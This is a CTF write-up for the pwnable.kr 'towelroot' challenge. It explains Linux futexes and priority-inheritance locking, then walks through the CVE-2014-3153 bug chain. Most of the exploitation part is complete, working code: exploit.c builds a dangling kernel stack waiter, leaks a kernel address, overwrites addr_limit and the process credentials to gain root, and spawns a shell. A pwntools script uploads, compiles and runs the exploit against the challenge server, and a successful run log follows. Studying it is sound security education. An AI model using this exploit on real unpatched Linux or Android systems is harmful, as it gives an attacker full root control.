# Pwnable.kr towelroot CTF Writeup
![image](https://hackmd.io/_uploads/BkH5WhTkMg.png)

flag of syscall: `Must_san1tize_Us3r_p0int3r`
## Basics
### Doubly-Linked List
The definition of list_head is quite simple (as found in `include/linux/types.h`):
```c
struct list_head {
    struct list_head *next, *prev;
};
```
![image](https://hackmd.io/_uploads/H1Xueia1fx.png)
The buttom shows the normal state of the doubly linked list while the top shows the corrupted state.

### Priority List
Priotiry list is a doubly-linked list but each node contians an int that represents its priotiry. It's definition can be found in `include\linux\plist_types.h`:
```c
struct plist_node {
	int		 prio;
	struct list_head node_list; // linked list of all the nodes in the list, sorted by priority
        struct list_head prio_list; // linked list that contains only one node of each priority, sorted by priority
};
```
The idea is to allow each node to have a numeric priority assigned to it, and that inserting/removing items will always leave it ordered (from low to high priority).

Another thing is that plists are always accessed via a head node which is just a `list_head` which points to the first `node_list` node:
```c
struct plist_head {
	struct list_head node_list;
};
```
Here's an example for a priority list:
![image](https://hackmd.io/_uploads/S1TJH1qtfg.png)

In case you wonder what is the use of `prio_list`, its primprly for making insertion and removal of nodes with the same priority efficient.

### what’s a futex?
A futex is a low-level synchronization mechanism:
- Most work happens in user space
- Kernel is only involved when threads need to block or wake

Used by things like:
- pthread mutexes
- condition variables

#### how to run operations

To run opeartions on a futex we use the `FUTEX_*` constants that describe the operation to perform.
`uaddr` points to the "futex word" - four bytes describing the futex.

```
long syscall(SYS_futex, uint32_t *uaddr, FUTEX_*, ...);
```

##### Relevant Futex Operations
`FUTEX_WAIT` - Sleep until futex word changes.
`FUTEX_REQUEUE` - Wake N waiters, move M others to a different futex queue. `FUTEX_WAIT_REQUEUE_PI` - Sleep on normal futex, expecting to be requeued onto a PI futex.
`FUTEX_CMP_REQUEUE_PI` - The waker side — requeue PI waiters.

##### Futux hash table
The kernel maintains a futex hash table of `futex_q` structures (one `futex_q` per waiting thread) keyed by the physical address of the futex word.
![image](https://hackmd.io/_uploads/H1fBMNiFMl.png)
As you can see, a futux hash bucket contains a linked list of waiters (`futex_q`) ordered by priority. It uses the `plist` data sturcture mentioned earlier.

The waiters need to be ordered by priority for priority inheritance (PI) futexes.

##### Priority Inheritance (PI) futexes
Before i'll explain about PI futex, I need to explain about the problem it solves.

##### The problem: Priority Invertion
This is a problem where high priority thread is blocked by a lower priority thread holding a lock. 
It can be direct:
```
High   → waiting for low thread to release the lock
Low    → running and holding the lock
```
or indirect:
```
High   → waiting for low thread to release the lock
Medium → running and holding the lock
Low    → cannot run → cannot release lock
```
##### The solution: Priority Inheritance (PI)
With priority inheritance, when a high-priority thread blocks on a lock held by a low-priority thread, the lock owner temporarily inherits the priority of the highest-priority waiting thread. This allows the lower-priority thread to run and release the lock, allowing the high-priority thread to acquire it. This mechanism handles both direct and indirect priority inversion.

PI futex is a special kind of futex that uses this mechanism. They can be used with:
```
FUTEX_LOCK_PI — acquire a PI futex, using priority inheritance if it is already owned.
FUTEX_UNLOCK_PI — release the PI futex and wake a waiting thread.
...
```

##### Why does PI need priority-ordered waiters?
Suppose several threads are waiting for the same lock. The owner needs to inherit the priority of the highest-priority waiter.

The kernel therefore needs a way to track which waiter currently has the highest priority. For PI futexes, Linux uses the `rt_mutex` (real-time mutex) subsystem, which provides priority-aware locking and maintains its waiters in priority order. This allows the kernel to identify the highest-priority waiter and adjust the lock owner's inherited priority accordingly.


##### `futex_q` vs `rt_mutex_waiter`

These two structures are easy to confuse.

###### `futex_q`
A `futex_q` represents a thread waiting on a futex.

###### `rt_mutex_waiter`
It can be found in `include\linux\rtmutex.h`:
```c
struct rt_mutex {
    raw_spinlock_t wait_lock;
    struct plist_head wait_list; /* The "head" of a priority list of rt_mutex_waiter objects */
    struct task_struct *owned;
};

struct rt_mutex_waiter {
    struct plist_node   list_entry;      /* linked into lock->wait_list      */
    struct plist_node   pi_list_entry;   /* linked into task->pi_waiters     */
    struct task_struct  *task;           /* who is blocking                  */
    struct rt_mutex     *lock;           /* which lock it's blocked on       */
};
```
**note:** the current implemention of this is a bit diffrent, for example it uses `rb_root` (red black tree) instead of `plist_head`:
```c
struct rt_mutex_base {
	raw_spinlock_t		wait_lock;
	struct rb_root_cached   waiters __guarded_by(&wait_lock);
	struct task_struct	*owner  __guarded_by(&wait_lock);
};
```
As you can see, for a PI futex linux also needs an `rt_mutex_waiter` representing the thread's participation in the `rt_mutex` PI system.

So the code flow looks like this:
```
     futex hash table
            │
            ▼
         futex_q
            │
            ▼
        PI state
            │
            ▼
        rt_mutex
            │
            ▼
     rt_mutex_waiter
            │
            ▼
         Thread A
```
#### Relevent futex opreations for this writeup
##### `futex_requeue`
```c
int futex_requeue(u32 __user *uaddr1, unsigned int flags1,
                  u32 __user *uaddr2, unsigned int flags2,
                  int nr_wake, int nr_requeue, u32 *cmpval, int requeue_pi)
```

Wakes `nr_wake` threads waiting on the futex at address `uaddr1` (with matching) flags, and enqueues `nr_requeue` threads waiting on the futex at address `uaddr1` to now wait on the address `uaddr2`.
The arguments `cmpval` (expected value of `uaddr1`) and `requeue_pi` aren't relevant and should be set to `NULL` and `0`.

##### `futex_wait_requeue_pi`
```c
int futex_wait_requeue_pi(u32 __user *uaddr, unsigned int flags,
                          u32 val, struct hrtimer_sleeper *timeout,
                          u32 __user *uaddr2);
```

It basically means “wait on the futex at `uaddr` until another thread requeues me onto the PI futex at `uaddr2`. Once requeued, try to acquire `uaddr2` or use the PI mechanism if it is already owned.”

#### Normal usage of `futex_requeue` and `futex_wait_requeue_pi`
`futex_wait_requeue_pi` and `futex_requeue` are designed to work together when implementing PI-aware condition variables, a synchronization mechanism that allows a thread to sleep until a condition becomes true.

`futex_wait_requeue_pi` puts the waiter to sleep on the initial, non-PI futex and specifies the PI futex it should eventually be requeued to. Later, `futex_requeue` moves the waiter from the first futex to the PI futex.

For example:
```c
/* Futexes */
int cond = 0;
int mutex = 0;

void thread_a(void *arg)
{
    ...

    int ret = futex_wait_requeue_pi(&cond, &mutex);

    /*
     * Thread A is now waiting on the condition futex.
     * When another thread requeues it, the kernel attempts
     * to acquire the PI futex (mutex) on A's behalf.
     */

    ...
}

void thread_b(void *arg)
{
    ...

    int ret = futex_requeue(&cond, &mutex, ...);

    /*
     * The kernel attempts to acquire the PI futex for the
     * requeued waiter. If the mutex is available, the waiter
     * can acquire it and be woken. If the mutex is contended,
     * the waiter is added to the rt_mutex waiter tree so that
     * the PI mechanism can manage it.
     */

    ...
}
```

## Towelroot and the futex vulnerability
### Relock on PI futex bug
Suppose you run:
```c
int mutex = 0;
futex_lock_pi(&mutex);
```
which gives:
```c
mutex = 453
```
But then you release it manually (and you can because `mutex` is in userspace):
```c
mutex = 0;
```
This is the bug.

You're changing the userspace representation of the lock without telling the kernel that the PI lock was released.

So now in the userspace the mutex is unlocked, but in the kernel:
```
futex_pi_state
      ↓
   rt_mutex
      ↓
owner = TID 453
        ↑
"locked" (not 0)
```
Those two states disagree.

Then thread 459 calls:
```c
futex_lock_pi(&mutex);
```
Because the futex word is 0, the fast path can make it look like the lock is available, and thread 459 acquires it:
```
Mutex acquired (mutex = 459)
```
**The result:** the same PI futex can appear **unlocked in userspace while still being owned in the kernel**, allowing the lock to be acquired again without properly releasing the previous kernel side ownership. This leaves the kernel's PI state inconsistent and can lead to serious memory safety problems when that stale state is later accessed.

 **Note:** this bug only exists for PI futex because only it uses `rt_mutex`.
 
#### The fix
Not realted to this writeup but still good to know.

The kernel fix handles cases where the userspace futex word cannot be updated correctly. Instead of leaving the kernel's internal PI state inconsistent, it makes `futex_pi_state` agree with the `rt_mutex` owner:
```c
pi_state_update_owner(pi_state, rt_mutex_owner(&pi_state->pi_mutex));
```
So, in the recovery case:
```
rt_mutex
    ↓
owner = 459
    
pi_state
    ↓
owner = 459
```

The kernel does not normally ignore the userspace futex word. The userspace word is an important part of the futex fast path. This fallback is specifically for an error case where the userspace state cannot be safely updated.

The important idea is that a PI futex has both a userspace futex word and kernel-side PI state, and the kernel must keep its internal state consistent. So it uses the `rt_mutex` owner to repair `futex_pi_state`, preventing the kernel's internal PI state from becoming inconsistent, and the userspace futex word can remain unchanged/wrong.

### `futex_wait_requeue_pi` bug 
`FUTEX_WAIT_REQUEUE_PI` sets up a waiter expecting to be moved to a PI futex queue. The kernel sets a flag `q.rt_waiter != NULL` to mark this expectation.

The bug: `FUTEX_CMP_REQUEUE_PI` can requeue a waiter that was originally waiting on a PI futex back onto the same PI futex, instead of a different one. Alternatively — and this is the key path — it can requeue a `FUTEX_WAIT` (non-PI) waiter directly onto a PI futex queue. The kernel does not validate that the source and destination futex addresses differ, and does not check that the waiter's PI expectations are consistent.

### Combining the bugs
Let me remind you that the following flow is relevant only to PI futexes, because only they maintain an `rt_mutex` with kernel-side state — and the root of the vulnerability is the lack of synchronization between userspace and kernel space.

I will explain the vulnerability using an example with two threads. The vulnerability flow looks like this:

![image](https://hackmd.io/_uploads/H1wCNBBcMl.png)

### Step 1 - `futex_lock_pi(B)` - Thread 1

The first thread locks futex `B`.

### Step 2 - `futex_wait_requeue_pi(A, B)` - Thread 2

Let us remember that every thread has its own kernel stack. This step allocates an `rt_waiter` on the kernel stack of Thread 2 and causes `futex_q` to point to it.

### What is `rt_waiter`?

It is a struct designed to describe a task that is waiting for a specific `rt_mutex`.

```c
struct rt_mutex_waiter {
    struct plist_node   list_entry;    // node in rt_mutex's wait_list
    struct plist_node   pi_list_entry; // node in owner's pi_list
    struct task_struct  *task;         // the waiting thread
    struct rt_mutex     *lock;         // which lock we're waiting on
};
```

It is allocated on the kernel stack frame of the thread inside the `futex_wait_requeue_pi` function, and `futex_q` points to it:

```c
static int futex_wait_requeue_pi(...) {
    struct rt_mutex_waiter rt_waiter;  // ← stack allocated
    q.rt_waiter = &rt_waiter;
    // ...
}
```

`q.rt_waiter` is supposed to point to it when the thread starts waiting and be released from it when the thread finishes. But in this flow, **this is not what happens**, we will understand why shortly.

### Step 3 - `futex_requeue_pi(&A, &B, A)` - Thread 1

This operation moves sleeping threads from the queue of futex `A` into the queue of futex `B` (in our case - Thread 2).

Inside this function, `futex_proxy_trylock_atomic` is called, which tries to acquire futex `B` for Thread 2. Since Thread 1 already holds it from Step One, the operation fails. Therefore, the function calls `rt_mutex_start_proxy_lock`, which simply inserts Thread 2's `rt_waiter` into the waiting list of `rt_mutex B`.

It is important not to confuse the futex hash table with the waiting list of `rt_mutex`es, these are two different things that handle different things:

`futex_q` is the **futex-level** representation — "this thread is associated with this futex".

`rt_waiter` is the **rt_mutex-level** representation — "this thread is waiting on this lock and needs priority inheritance".

Step Three updates both of these lists to the following state:

```text
futex hash table:
  A's bucket: []
  B's bucket: [futex_q]  ← futex level tracking

B's rt_mutex:
  wait_list: [rt_waiter]  ← PI/priority level tracking
```

For this vulnerability, we are more interested in the `wait_list` of the `rt_mutex`.

### Step 4 - `B = 0` (relock bug) - Thread 1

The thread manually puts `0` at the address of futex `B` (meaning it releases it without kernel intervention).

### Why does this bug contribute? Why can't I release the lock normally?

If we used `futex_unlock_pi`, the kernel would detect that it was released, then it would wake Thread 2 and allow it to acquire the lock.

This is not what we want to happen because in this case the kernel would remove Thread 2's `rt_waiter` from the waiting list of `B` and cause `futex_q` to no longer point to it (`q.rt_waiter = NULL`). The exploitation tries to avoid this case.

By exploiting this bug, the kernel does not know that the lock was released in userspace, so it does not perform these operations.

### Step 5 - `futex_requeue_pi(&B, &B, B)` (requeue bug) - Thread 1

The function calls `futex_proxy_trylock_atomic`, and this time it succeeds (because the value at the address of futex `B` is `0`). Therefore, it calls `requeue_pi_wake_futex`, which clears `q.rt_waiter` for Thread 2 and wakes it up.

### Step 6 - `futex_wait_requeue_pi(A, B)` - Thread 2

Thread 2 wakes up as a result of the previous step and continues running inside `futex_wait_requeue_pi`. It executes the following code:

```c
/* When the thread is woken up via requeue_pi_wake_futex,
 * q->rt_waiter is NULL, so the following branch is taken */
if (!q.rt_waiter) {
...
} else {
...
    /* This is the branch NOT TAKEN, which would normally remove
     * rt_waiter from the waiter list */
    ret = rt_mutex_finish_proxy_lock(pi_mutex, to, &rt_waiter, 1);
...
}
```

When `futex_requeue` performed `q.rt_waiter = null` in the previous step, it essentially told the thread it woke up: "You got lucky! You acquired the lock immediately without waiting in the `rt_mutex` waiting list. Since you were not in the waiting list at all, there is no need for you to perform cleanup and remove your `rt_waiter` from the `rt_mutex` (because it does not exist)."

Although this is a blatant lie, since its `rt_waiter` does in fact exist in the `rt_mutex` (as a result of the `futex_requeue` in Step Three).

Therefore, Thread 2 does not call `rt_mutex_finish_proxy_lock`, **and its `rt_waiter` remains inside the wait list of the `rt_mutex`** — meaning there is a **dangling pointer**. As we remember, `rt_waiter` is a local variable in the kernel stack frame that is allocated in `futex_wait_requeue_pi`, meaning that when the function finishes, this stack frame is released and `rt_waiter` is no longer valid.

**So why is this dangerous?** Because immediately after this flow we can call certain syscalls that will override this kernel stack frame and essentially gain some control over the linked list of the `rt_mutex` (meaning the `wait_list`).

### Exploitation
We can create 2 fake waiters in userspace with controlled priorities like this:
![image](https://hackmd.io/_uploads/HyA_cl1sGg.png)
And then use `futex_lock_pi` to create a new waiter on the list, which will be in between the 2 fake userspace waiters:
![image](https://hackmd.io/_uploads/ryTkol1izx.png)
The interesting part is that when the kernel updates the pointer values of the neighboring waiters, it does the following:

```c
prev_waiter.next->prev = &new_waiter
```

And since we control what will be in `prev_waiter.next->prev`, we have a **restricted write primitive**.

The next step is to override `thread_info.addr_limit` so we can change its value to `0xFFFFFFFF` (arbitrary read/write).
We may need to try overriding `addr_limit` multiple times using the same trick if `&new_waiter` isn't high enough for the kernel stack of the thread we're currently in.

After we have arbitrary read/write, we can just read the address of the `cred` struct that's located in `thread_info`.
Then change the `uid` to `0` and turn on all the bits in each `cap_*` structure.

That's it, we won!


## Problem Description

### helper.c
#### sys_unknown

```c
// this system call is only added to make the task easier.
// no need to analyze/exploit this function. just use it as an helper for real-world exploit.
asmlinkage long sys_unknown(int n){
        char buf[4096];
        int i=0;
        for(i=0; i<4096; i++){
                buf[i] = n;
        }
        buf[4095]=0;
        g_len=strlen(buf);
        g_stack=&buf;
        while(1){
                schedule();
        }
        return 0;
}
```
Seems like we could use this syscall to override the dangling `rt_waiter`. The original exploit uses `sendmmsg` (or other syscalls that reach deep enough into the stack).

However, the fill is one byte we control. `sys_unknown` writes the same byte `n` into all 4096 bytes, so we can't set the specific pointers the fake node needs (unlike with `sendmmsg`).

Tbh I don't really understand how this syscall makes my life any easier, and I haven't given it much thought because I can just use `sendmmsg`. So in my exploit I won't be using it.

### Kernel version
Let's check the kernel version to see if it's affected by Towelroot.
```
$ uname -r
3.11.4
```
According to https://nvd.nist.gov/vuln/detail/cve-2014-3153, this kernel version is indeed affected!

## Exploit Code
### `exploit.c`
```c
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <signal.h>

#include "futex.h"   // futex wrappers + rt_mutex_waiter / plist_node
#include "kernel.h"  // thread_info, cred, constants

// glibc errno accessor (avoids <errno.h>, which needs linux/errno.h)
extern int *__errno_location(void);
#define errno (*__errno_location())

#define THREAD_WAIT_SEC   1
#define FILLER            "AAAAAAAA"
#define DEFAULT_PRIO      0

// ---- Logging ----
#define LOG(fmt, ...) \
    fprintf(stderr, "[%-12s] " fmt "\n", __func__, ##__VA_ARGS__)

#define LOG_ERR(fmt, ...) \
    fprintf(stderr, "[%-12s] ERROR: " fmt " (errno=%d: %s)\n", \
            __func__, ##__VA_ARGS__, errno, strerror(errno))

#define assert_(x)                                  \
    if (!(x))                                       \
    {                                               \
        fprintf(stderr, "[assert] failed: %s\n", #x); \
        fprintf(stderr, "[assert] errno=%d: %s\n", errno, strerror(errno)); \
        puts(#x);                                   \
        exit(0);                                    \
    }

// ---- Globals shared between stages ----
uint32_t non_pi = 0, pi = 0;
struct rt_mutex_waiter fake_waiter;
void *leaked_waiter_addr;
struct thread_info *victim_thread_info;
pthread_t leaked_waiter_thread;
int socks[2];

// used by the sendmmsg overlay (stage 1)
struct iovec msg[7];
struct mmsghdr msgvec;

// ---- Thread helpers ----
pthread_t run_thread(void *(*fn)(void *), void *arg)
{
    pthread_t t;
    int rc = pthread_create(&t, NULL, fn, arg);
    if (rc) {
        errno = rc;
        LOG_ERR("pthread_create failed");
    } else {
        LOG("spawned thread %lu running %p", (unsigned long)t, (void *)fn);
    }
    assert_(!rc);
    return t;
}

void *lock_pi_with_prio(void *arg)
{
    int priority = (int)(long)arg;
    setpriority(PRIO_PROCESS, 0, priority);
    futex_lock_pi((int *)&pi);
    return NULL;
}

// ---- Stage 1: create the dangling (UAF) waiter ----
void setup_stack_overwriter(void)
{
    LOG("creating socketpair");
    assert_(!socketpair(AF_UNIX, SOCK_STREAM, 0, socks));
    LOG("socketpair ok: fds=[%d, %d]", socks[0], socks[1]);

    // Fill the socket buffer until send() fails with EAGAIN, so the
    // next sendmmsg() blocks inside the kernel.
    int sent = 0;
    while (send(socks[0], FILLER, strlen(FILLER), MSG_DONTWAIT) != -1)
        sent++;
    LOG("filled socket buffer: %d sends before EAGAIN (errno=%d)", sent, errno);
}

void overwrite_stack(void)
{
    // fake waiter overlaid onto the dangling rt_waiter (offset measured from experiments)
    struct rt_mutex_waiter *stack_fake_waiter =
        (struct rt_mutex_waiter *)((void *)&msg + 32);

    stack_fake_waiter->list_entry.prio = 0;
    stack_fake_waiter->list_entry.prio_list.next =
    stack_fake_waiter->list_entry.prio_list.prev = &fake_waiter.list_entry.prio_list;
    stack_fake_waiter->list_entry.node_list.next =
    stack_fake_waiter->list_entry.node_list.prev = &fake_waiter.list_entry.node_list;

    msgvec.msg_hdr.msg_iov = msg;
    msgvec.msg_hdr.msg_iovlen = sizeof(msg) / sizeof(msg[0]);

    int rc = sendmmsg(socks[0], &msgvec, 1, 0);
    LOG("sendmmsg returned %d", rc);
    assert_(!rc);
}

void sigusr_handler(int sig);

void *uafed_waiter_thread(void *arg) // Thread 2
{
    (void)arg;
    LOG("thread 2 started (tid-ish %lu)", (unsigned long)pthread_self());

    signal(SIGUSR1, sigusr_handler); // so this thread can be woken later when pthread_kill is called
    LOG("SIGUSR1 handler installed");

    setup_stack_overwriter();

    // sleep on non_pi, expecting to be requeued onto pi
    LOG("calling futex_wait_requeue_pi on non_pi=%p -> pi=%p", (void *)&non_pi, (void *)&pi);
    futex_wait_requeue_pi((int *)&non_pi, (int *)&pi, 0);
    // CAN'T LOG HERE! IT WILL AFFECT THE STACK!

    // once woken, overlay the dangling waiter via sendmmsg
    overwrite_stack();
    LOG("overwrite_stack finished");
    return NULL;
}

void stage_create_uaf(void) // Thread 1
{
    LOG("=== Stage 1: create UAF waiter ===");

    // step 1: lock pi so the next locker must block
    LOG("step 1: locking pi (pi=%u)", pi);
    int rc = futex_lock_pi((int *)&pi);
    LOG("step 1: futex_lock_pi returned %d", rc);
    assert_(rc == 0);

    // start thread 2, give it time to reach futex_wait_requeue_pi
    LOG("step 2: starting thread 2");
    run_thread(uafed_waiter_thread, NULL);
    LOG("sleeping %d s for thread 2 to block", THREAD_WAIT_SEC);
    sleep(THREAD_WAIT_SEC);

    // step 3: requeue thread 2 from non_pi onto pi
    LOG("step 3: futex_cmp_requeue_pi non_pi -> pi (nr_wake=1, expected=%u)", non_pi);
    rc = futex_cmp_requeue_pi((int *)&non_pi, (int *)&pi, 1, non_pi);
    LOG("step 3: futex_cmp_requeue_pi returned %d", rc);
    sleep(THREAD_WAIT_SEC);

    // add another waiter so pi_state is not freed
    LOG("step 3b: spawning extra PI waiter so pi_state stays alive");
    run_thread(lock_pi_with_prio, (void *)(long)DEFAULT_PRIO);
    sleep(THREAD_WAIT_SEC);

    // step 4: release pi (relock bug)
    LOG("step 4: releasing pi (pi=%u -> 0)", pi);
    pi = 0;

    // step 5: requeue pi onto itself (requeue bug), leaving the dangling waiter
    LOG("step 5: futex_cmp_requeue_pi pi -> pi (self-requeue, expected=%u)", pi);
    rc = futex_cmp_requeue_pi((int *)&pi, (int *)&pi, 1, pi);
    LOG("step 5: futex_cmp_requeue_pi returned %d", rc);
    LOG("=== Stage 1 done ===");
}

// ---- Stage 2: leak a kernel stack address ----
void stage_leak(void)
{
    LOG("=== Stage 2: leak kernel stack address ===");

    fake_waiter.list_entry.prio = 0x1000; // so new waiter will be inserted in front of it
    fake_waiter.list_entry.prio_list.prev = (struct list_head_k *)&leaked_waiter_addr;
    fake_waiter.list_entry.node_list.prev = (struct list_head_k *)&leaked_waiter_addr;
    LOG("fake_waiter prio=0x1000, list prev -> &leaked_waiter_addr=%p",
        (void *)&leaked_waiter_addr);

    // add a waiter so the kernel writes its address to `leaked_waiter_addr`
    leaked_waiter_thread = run_thread(lock_pi_with_prio, (void *)(long)(DEFAULT_PRIO + 1));
    LOG("sleeping %d s for kernel to write waiter address", THREAD_WAIT_SEC);
    sleep(THREAD_WAIT_SEC);

    victim_thread_info = (void *)((unsigned long)leaked_waiter_addr & THREAD_INFO_MASK);
    LOG("leaked_waiter_addr=%p", leaked_waiter_addr);
    LOG("victim_thread_info=%p (mask=%#lx)",
        (void *)victim_thread_info, (unsigned long)THREAD_INFO_MASK);
    LOG("=== Stage 2 done ===");
}

// ---- Stage 3: overwrite addr_limit ----
void stage_addr_limit(void)
{
    LOG("=== Stage 3: overwrite addr_limit ===");
    LOG("target &victim_thread_info->addr_limit=%p",
        (void *)&victim_thread_info->addr_limit);

    // Re-arm the fake waiter before every insert. Each insert moves fake.prev
    // to the new waiter, so without this the next insert misses addr_limit.
    int address_limit = -1;
    int iter = 0;
    do {
        iter++;
        fake_waiter.list_entry.prio = 0x1000;
        fake_waiter.list_entry.prio_list.prev = (struct list_head_k *)&victim_thread_info->addr_limit;
        fake_waiter.list_entry.node_list.prev = (struct list_head_k *)&victim_thread_info->addr_limit;
        LOG("attempt %d: spawning PI waiter", iter);
        run_thread(lock_pi_with_prio, (void *)(long)(DEFAULT_PRIO + 1));
        sleep(THREAD_WAIT_SEC);
    } while (kernel_memcpy(&address_limit, &victim_thread_info->addr_limit, sizeof(address_limit)));

    LOG("kernel_memcpy succeeded after %d retries", iter);
    LOG("=== Stage 3 done ===");
}

// ---- Stage 4: runs inside the compromised thread ----
void sigusr_handler(int sig)
{
    (void)sig;
    stage_addr_limit(); // must run in the leaked thread, so kernel_memcpy uses its addr_limit
    LOG("=== Stage 4: privilege escalation (signal %d) ===", sig);

    void *task = read_ptr(&victim_thread_info->task);
    LOG("task_struct=%p", task);

    // find cred pointer (search task_struct for OUR_COMM)
    struct cred *cred = find_cred(task);
    LOG("find_cred returned %p", (void *)cred);
    assert_(cred != NULL);

    int rc = overwrite_creds(cred);
    LOG("overwrite_creds returned %d", rc);
    assert_(rc == 0);

    LOG("launching /bin/sh");
    system("/bin/sh");
    exit(0);
}

int main(void)
{
    LOG("pid=%d starting exploit", getpid());
    stage_create_uaf();
    stage_leak();
    LOG("sending SIGUSR1 to leaked waiter thread");
    pthread_kill(leaked_waiter_thread, SIGUSR1);

    // keep the process alive so the threads stay blocked
    LOG("main thread idling");
    while (1)
        sleep(1);

    return 0;
}
```

### `hq.py`
```python
from pwn import *
import gzip

SOURCES = ["exploit.c", "futex.c", "futex.h", "kernel.c", "kernel.h"]
PROMPT = b"/ $ "


def sh(io, cmd):
    io.sendline(cmd)
    return io.recvuntil(PROMPT, drop=True)


def main():
    io = remote("pwnable.kr", 10052)
    io.recvuntil(PROMPT)
    sleep(1)
    sh(io, b"stty -echo")

    for name in SOURCES:
        dst = b"/tmp/" + name.encode()
        sh(io, b"rm -f " + dst)
        data = open(name, "rb").read()
        for i in range(0, len(data), 400):
            blob = b64e(gzip.compress(data[i:i + 400])).encode()
            sh(io, b'echo -n "' + blob + b'" | base64 -d | gzip -d >> ' + dst)
        log.info("sent " + name)

    srcs = b" ".join(b"/tmp/" + s.encode() for s in SOURCES if s.endswith(".c"))
    err = sh(io, b"gcc -std=gnu99 -pthread -I/tmp -o /tmp/exploit " + srcs)
    if err.strip():
        log.error(err.decode(errors="replace"))

    sh(io, b"chmod +x /tmp/exploit")
    io.sendline(b"/tmp/exploit")
    io.sendline(b"cat /root/flag")

    while True:
        line = io.recvline()
        if line.startswith(b"/ #"):
            break
        sys.stderr.write(line.rstrip(b"\r\n").decode(errors="replace") + "\n")
        sys.stderr.flush()

    flag = line[3:].decode(errors="replace").strip()
    log.success("flag: " + flag)


if __name__ == "__main__":
    main()
```

## Time to attack!
```bash
dalal@ItamarLaptop:/mnt/c/users/.../pwnable.kr/towelroot$ python3 hq.py
[+] Opening connection to pwnable.kr on port 10052: Done
[*] sent exploit.c
[*] sent futex.c
[*] sent futex.h
[*] sent kernel.c
[*] sent kernel.h
[main        ] pid=681 starting exploit
[stage_create_uaf] === Stage 1: create UAF waiter ===
[stage_create_uaf] step 1: locking pi (pi=0)
[stage_create_uaf] step 1: futex_lock_pi returned 0
[stage_create_uaf] step 2: starting thread 2
[run_thread  ] spawned thread 1995093104 running 0x8d15
[stage_create_uaf] sleeping 1 s for thread 2 to block
[uafed_waiter_thread] thread 2 started (tid-ish 1995093104)
[uafed_waiter_thread] SIGUSR1 handler installed
[setup_stack_overwriter] creating socketpair
[setup_stack_overwriter] socketpair ok: fds=[3, 4]
[setup_stack_overwriter] filled socket buffer: 366 sends before EAGAIN (errno=11)
[uafed_waiter_thread] calling futex_wait_requeue_pi on non_pi=0x13090 -> pi=0x13094
[stage_create_uaf] step 3: futex_cmp_requeue_pi non_pi -> pi (nr_wake=1, expected=0)
[stage_create_uaf] step 3: futex_cmp_requeue_pi returned 1
[stage_create_uaf] step 3b: spawning extra PI waiter so pi_state stays alive
[run_thread  ] spawned thread 1986704496 running 0x8a5d
[stage_create_uaf] step 4: releasing pi (pi=2147484329 -> 0)
[stage_create_uaf] step 5: futex_cmp_requeue_pi pi -> pi (self-requeue, expected=0)
[stage_create_uaf] step 5: futex_cmp_requeue_pi returned -1
[stage_create_uaf] === Stage 1 done ===
[stage_leak  ] === Stage 2: leak kernel stack address ===
[stage_leak  ] fake_waiter prio=0x1000, list prev -> &leaked_waiter_addr=0x130c4
[run_thread  ] spawned thread 1978315888 running 0x8a5d
[stage_leak  ] sleeping 1 s for kernel to write waiter address
[stage_leak  ] leaked_waiter_addr=0x8372dde4
[stage_leak  ] victim_thread_info=0x8372c000 (mask=0xffffe000)
[stage_leak  ] === Stage 2 done ===
[main        ] sending SIGUSR1 to leaked waiter thread
[stage_addr_limit] === Stage 3: overwrite addr_limit ===
[stage_addr_limit] target &victim_thread_info->addr_limit=0x8372c008
[stage_addr_limit] attempt 1: spawning PI waiter
[main        ] main thread idling
[run_thread  ] spawned thread 1969927280 running 0x8a5d
[stage_addr_limit] attempt 2: spawning PI waiter
[run_thread  ] spawned thread 1959785584 running 0x8a5d
[stage_addr_limit] kernel_memcpy succeeded after 2 retries
[stage_addr_limit] === Stage 3 done ===
[sigusr_handler] === Stage 4: privilege escalation (signal 10) ===
[sigusr_handler] task_struct=0x869603c0
[sigusr_handler] find_cred returned 0x837af180
[sigusr_handler] overwrite_creds returned 0
[sigusr_handler] launching /bin/sh
/bin/sh: can't access tty; job control turned off
[+] flag: ...
[*] Closed connection to pwnable.kr port 10052
```
